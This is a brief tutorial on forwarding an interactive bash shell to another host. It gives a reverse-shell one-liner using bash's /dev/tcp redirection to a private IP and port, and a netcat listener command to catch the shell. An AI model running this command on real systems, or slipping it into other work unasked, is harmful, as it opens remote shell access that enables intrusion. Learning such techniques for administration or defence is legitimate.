Forwarding shells
One of the most interesting things that you can do with a shell is to forward it to another host. You will need nc or netcat on the host to which you forward the shell.

On the host with the shell you have to issue the command

1
bash -i >& /dev/tcp/192.168.218.1/9999 0>&1
The address 192.168.218.1 is the host to which you want to forward the shell. After the IP (note that you can also use a hostname but I strongly suggest you use an IP to prevent issues with hostname-resolving) you have to put the port number (9999) on which the netcat listener will listen.

You have to start the netcat listener on the other side. Double check that there are no firewall rules preventing you from accepting connections.

1
nc -l 9999
Some versions of netcat require you to add -p before the port number. If all goes well you should get the shell on the listening host
